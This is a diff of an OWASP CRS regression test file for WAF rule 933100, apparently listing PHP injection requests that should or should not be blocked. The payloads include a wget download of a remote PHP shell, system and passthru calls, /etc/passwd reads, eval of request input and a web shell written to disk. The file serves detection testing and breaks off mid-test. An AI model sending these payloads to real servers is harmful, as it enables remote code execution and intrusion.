@@ -1,10 +1,12 @@
 ---
 meta:
-  author: "csanders-git, Franziska Bühler, azurit"
+  author: "csanders-git, Franziska Bühler, azurit, touchweb_vincent"
 rule_id: 933100
 tests:
   - test_id: 1
-    desc: PHP Injection Attack (933100) from old modsec regressions
+    desc: |
+      PHP Injection Attack: Short tag with exec function
+      decoded payload: <? exec('wget http://r57.biz/r57.txt -O
     stages:
       - input:
           dest_addr: 127.0.0.1
@@ -18,7 +20,7 @@ tests:
             User-Agent: "OWASP CRS test agent"
           method: GET
           port: 80
-          uri: "/get?foo=<?exec('wget%20http://r57.biz/r57.txt%20-O"
+          uri: "/get?foo=%3C%3F%20exec%28%27wget%20http%3A%2F%2Fr57.biz%2Fr57.txt%20-O"
           version: HTTP/1.1
         output:
           log:
@@ -147,3 +149,1507 @@ tests:
         output:
           log:
             expect_ids: [933100]
+  - test_id: 9
+    desc: |
+      Smarty 3.1.19- {php} tag payload
+      decoded payload: {php}test{/php}
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%7Bphp%7Dtest%7B%2Fphp%7D"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 10
+    desc: |
+      PHP opening tag with short syntax
+      decoded payload: <?= "test"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%3C%3F%3D%20%22test%22"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 11
+    desc: |
+      PHP short echo tag injection payload
+      decoded payload: <?=1;echo 1;
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%3C%3F%3D1%3Becho%201%3B"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 12
+    desc: |
+      PHP opening tag with explicit php keyword
+      decoded payload: <?php echo "test"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%3C%3Fphp%20echo%20%22test%22"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 13
+    desc: |
+      PHP opening tag with explicit php keyword, uppercase
+      decoded payload: <?PHP echo "test"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%3C%3FPHP%20echo%20%22test%22"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 14
+    desc: |
+      PHP opening tag with mixed case
+      decoded payload: <?pHp echo "test"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%3C%3FpHp%20echo%20%22test%22"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 15
+    desc: |
+      PHP opening tag with space before php keyword
+      decoded payload: <? php echo "test"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%3C%3F%20php%20echo%20%22test%22"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 16
+    desc: |
+      Square bracket opening PHP tag
+      decoded payload: [php]echo "test"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%5Bphp%5Decho%20%22test%22"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 17
+    desc: |
+      Square bracket opening PHP tag, uppercase
+      decoded payload: [PHP]echo "test"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%5BPHP%5Decho%20%22test%22"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 18
+    desc: |
+      Curly brace opening PHP tag
+      decoded payload: {php}echo "test"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%7Bphp%7Decho%20%22test%22"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 19
+    desc: |
+      Curly brace opening PHP tag, uppercase
+      decoded payload: {PHP}echo "test"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%7BPHP%7Decho%20%22test%22"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 20
+    desc: |
+      Curly brace closing PHP tag
+      decoded payload: echo "test"{/php}
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=echo%20%22test%22%7B%2Fphp%7D"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 21
+    desc: |
+      Email containing 'php' should NOT match
+      decoded payload: richard.php@my-email.com
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?email=richard.php%40my-email.com"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 22
+    desc: |
+      Square bracket closing PHP tag, uppercase
+      decoded payload: echo "test"[/PHP]
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=echo%20%22test%22%5B%2FPHP%5D"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 23
+    desc: |
+      PHP tag in POST parameter
+      decoded payload: code=<?php system("ls")
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Content-Type: "application/x-www-form-urlencoded"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: POST
+          port: 80
+          uri: "/post"
+          data: "code=%3C%3Fphp%20system%28%22ls%22%29"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 24
+    desc: |
+      Negative test: <?php without trailing whitespace in cookie should NOT match
+      decoded payload: session=<?php
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Cookie: "session=<?php"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 25
+    desc: |
+      Negative test: <?php without trailing whitespace in parameter name should NOT match
+      decoded payload: parameter name contains <?php
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?%3C%3Fphp=value"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 26
+    desc: |
+      PHP tag with tab character
+      decoded payload: <?	php echo "test"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%3C%3F%09php%20echo%20%22test%22"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 27
+    desc: |
+      PHP tag with newline character
+      decoded payload: <?%0aphp echo "test"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%3C%3F%0Aphp%20echo%20%22test%22"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 28
+    desc: |
+      XML/PHP polyglot with namespace separator
+      decoded payload: <?xml:echo 1;
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%3C%3Fxml%3Aecho%201%3B"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 29
+    desc: |
+      PHP opening tag at end of input
+      decoded payload: test<?
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=test%3C%3F"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 30
+    desc: |
+      PHP tag with multiple spaces before function call
+      decoded payload: <? 		echo test
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%3C%3F%20%09%09echo%20test"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 31
+    desc: |
+      Legitimate XML declaration should NOT match
+      decoded payload: <?xml version="1.0" encoding="UTF-8"?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 32
+    desc: |
+      Legitimate XML declaration with tab after xml should NOT match
+      decoded payload: <?xml	version="1.0"?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%3C%3Fxml%09version%3D%221.0%22%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 33
+    desc: |
+      HTML entity with question mark should NOT match
+      decoded payload: &lt;? should not trigger
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%26lt%3B%3F%20should%20not%20trigger"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 34
+    desc: |
+      Square brackets in JSON should NOT match
+      decoded payload: {"array":["php","test"]}
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Content-Type: "application/json"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: POST
+          port: 80
+          uri: "/api/test"
+          data: '{"array":["php","test"]}'
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 35
+    desc: |
+      Curly braces in regular expression should NOT match
+      decoded payload: /[a-z]{1,5}/
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?pattern=%2F%5Ba-z%5D%7B1%2C5%7D%2F"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 36
+    desc: |
+      Non-PHP tag lookalike, not executable
+      decoded payload: <?xpaquet
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?foo=%3C%3Fxpaquet"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 37
+    desc: |
+      Legitimate XML payload
+      decoded payload: <?xml version="1.0" encoding="UTF-8"?><order><id>12345</id></order>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: POST
+          port: 80
+          uri: "/api/orders?flux=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3Corder%3E%3Cid%3E12345%3C%2Fid%3E%3C%2Forder%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 38
+    desc: |
+      PHP injection attack: Basic <?php tag
+      decoded payload: <?php system('id'); ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?cmd=%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 39
+    desc: |
+      PHP injection attack: <?PHP uppercase tag
+      decoded payload: <?PHP echo "test"; ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?cmd=%3C%3FPHP%20echo%20%22test%22%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 40
+    desc: |
+      PHP injection attack: <? short tag
+      decoded payload: <? echo 'hello'; ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?cmd=%3C%3F%20echo%20%27hello%27%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 41
+    desc: |
+      PHP injection attack: <? short tag with command execution
+      decoded payload: <? system($_GET['c']); ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?payload=%3C%3F%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 42
+    desc: |
+      PHP injection attack: <?= short echo tag with expression
+      decoded payload: <?=$_GET['data']?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?code=%3C%3F%3D%24_GET%5B%27data%27%5D%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 43
+    desc: |
+      PHP injection attack: [php] opening tag
+      decoded payload: [php]echo 'test';[/php]
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?code=%5Bphp%5Decho%20%27test%27%3B%5B%2Fphp%5D"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 44
+    desc: |
+      PHP injection attack: <?php with file_get_contents
+      decoded payload: <?php echo file_get_contents('/etc/passwd'); ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?x=%3C%3Fphp%20echo%20file_get_contents%28%27%2Fetc%2Fpasswd%27%29%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 45
+    desc: |
+      PHP injection attack: <?php with eval
+      decoded payload: <?php eval($_POST['code']); ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+            Content-Type: "application/x-www-form-urlencoded"
+          method: POST
+          port: 80
+          uri: "/submit"
+          data: "payload=%3C%3Fphp%20eval%28%24_POST%5B%27code%27%5D%29%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 46
+    desc: |
+      PHP injection attack: <?php in POST body
+      decoded payload: <?php passthru('ls -la'); ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+            Content-Type: "application/x-www-form-urlencoded"
+          method: POST
+          port: 80
+          uri: "/process"
+          data: "code=%3C%3Fphp%20passthru%28%27ls%20-la%27%29%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 47
+    desc: |
+      PHP injection attack: <?php with shell_exec
+      decoded payload: <?php $output = shell_exec('whoami'); ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?cmd=%3C%3Fphp%20%24output%20%3D%20shell_exec%28%27whoami%27%29%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 48
+    desc: |
+      PHP injection attack: <?php with include
+      decoded payload: <?php include('/tmp/shell.php'); ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?file=%3C%3Fphp%20include%28%27%2Ftmp%2Fshell.php%27%29%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 49
+    desc: |
+      PHP injection attack: <?php with require
+      decoded payload: <?php require($_GET['file']); ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?code=%3C%3Fphp%20require%28%24_GET%5B%27file%27%5D%29%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 50
+    desc: |
+      PHP injection attack: <?php with assert
+      decoded payload: <?php assert($_POST['c']); ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+            Content-Type: "application/x-www-form-urlencoded"
+          method: POST
+          port: 80
+          uri: "/api"
+          data: "x=%3C%3Fphp%20assert%28%24_POST%5B%27c%27%5D%29%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 51
+    desc: |
+      PHP injection attack: <?php with preg_replace /e modifier
+      decoded payload: <?php preg_replace('/test/e', $_GET['c'], 'test'); ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?regex=%3C%3Fphp%20preg_replace%28%27%2Ftest%2Fe%27%2C%20%24_GET%5B%27c%27%5D%2C%20%27test%27%29%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 52
+    desc: |
+      PHP injection attack: <?php with backticks
+      decoded payload: <?php $res = `id`; ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?exec=%3C%3Fphp%20%24res%20%3D%20%60id%60%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 53
+    desc: |
+      PHP injection attack: <?php with create_function
+      decoded payload: <?php create_function('', $_GET['c']); ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?func=%3C%3Fphp%20create_function%28%27%27%2C%20%24_GET%5B%27c%27%5D%29%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 54
+    desc: |
+      PHP injection attack: <?php in Cookie
+      payload: <?php phpinfo(); ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+            Cookie: "session=<?php phpinfo(); ?>"
+          method: GET
+          port: 80
+          uri: "/profile"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 55
+    desc: |
+      PHP injection attack: [PHP] uppercase tag
+      decoded payload: [PHP]system('whoami');[/PHP]
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?data=%5BPHP%5Dsystem%28%27whoami%27%29%3B%5B%2FPHP%5D"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 56
+    desc: |
+      PHP injection attack: <?xml polyglot with function call
+      decoded payload: <?xml :system('ls');
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?x=%3C%3Fxml%20%3Asystem%28%27ls%27%29%3B"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 57
+    desc: |
+      PHP injection attack: <?xml polyglot with exec
+      decoded payload: <?xml :exec('cat /etc/passwd');
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?payload=%3C%3Fxml%20%3Aexec%28%27cat%20%2Fetc%2Fpasswd%27%29%3B"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 58
+    desc: |
+      PHP injection attack: <?xml polyglot with passthru
+      decoded payload: <?xml :passthru('uname -a');
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/test?c=%3C%3Fxml%20%3Apassthru%28%27uname%20-a%27%29%3B"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 59
+    desc: |
+      Negative test: Legitimate XML with namespace
+      decoded payload: <?xml-stylesheet type="text/xsl" href="style.xsl"?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?data=%3C%3Fxml-stylesheet%20type%3D%22text%2Fxsl%22%20href%3D%22style.xsl%22%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 60
+    desc: |
+      Negative test: Legitimate XML declaration with standalone
+      decoded payload: <?xml version="1.0" standalone="yes"?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/api?doc=%3C%3Fxml%20version%3D%221.0%22%20standalone%3D%22yes%22%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 61
+    desc: |
+      Negative test: HTML with question mark (not PHP tag)
+      decoded payload: Is this a test? What do you think?
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/search?q=Is%20this%20a%20test%3F%20What%20do%20you%20think%3F"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 62
+    desc: |
+      Negative test: Math comparison with less-than and question mark
+      decoded payload: result = (x < 5) ? yes : no
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/calc?expr=result%20%3D%20%28x%20%3C%205%29%20%3F%20yes%20%3A%20no"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 63
+    desc: |
+      Negative test: URL with query parameters
+      decoded payload: http://example.com/page?id=123
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?url=http%3A%2F%2Fexample.com%2Fpage%3Fid%3D123"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 64
+    desc: |
+      Negative test: SVG with processing instruction
+      decoded payload: <?xml version="1.0"?><svg></svg>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: POST
+          port: 80
+          uri: "/upload"
+          data: "image=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Csvg%3E%3C%2Fsvg%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 65
+    desc: |
+      Negative test: XSLT processing instruction
+      decoded payload: <?xsl-stylesheet?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?style=%3C%3Fxsl-stylesheet%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            no_expect_ids: [933100]
+  - test_id: 66
+    desc: |
+      PHP injection attack: Minimal <? tag at end of input
+      decoded payload: test<?
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?x=test%3C%3F"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 67
+    desc: |
+      PHP injection attack: <?= with minimal content
+      decoded payload: <?=1?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/get?val=%3C%3F%3D1%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 68
+    desc: |
+      PHP injection attack: <?php with file upload simulation
+      decoded payload: <?php move_uploaded_file($_FILES['f']['tmp_name'], '/var/www/shell.php'); ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+            Content-Type: "application/x-www-form-urlencoded"
+          method: POST
+          port: 80
+          uri: "/upload"
+          data: "name=%3C%3Fphp%20move_uploaded_file%28%24_FILES%5B%27f%27%5D%5B%27tmp_name%27%5D%2C%20%27%2Fvar%2Fwww%2Fshell.php%27%29%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 69
+    desc: |
+      PHP injection attack: <?php with ob_start and eval
+      decoded payload: <?php ob_start(); eval($_REQUEST['c']); ob_end_flush(); ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+          method: GET
+          port: 80
+          uri: "/test?shell=%3C%3Fphp%20ob_start%28%29%3B%20eval%28%24_REQUEST%5B%27c%27%5D%29%3B%20ob_end_flush%28%29%3B%20%3F%3E"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 70
+    desc: |
+      PHP injection attack: <?php with fopen and fwrite
+      decoded payload: <?php $f=fopen('shell.php','w'); fwrite($f,'<?php eval($_GET[c]); ?>'); ?>
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
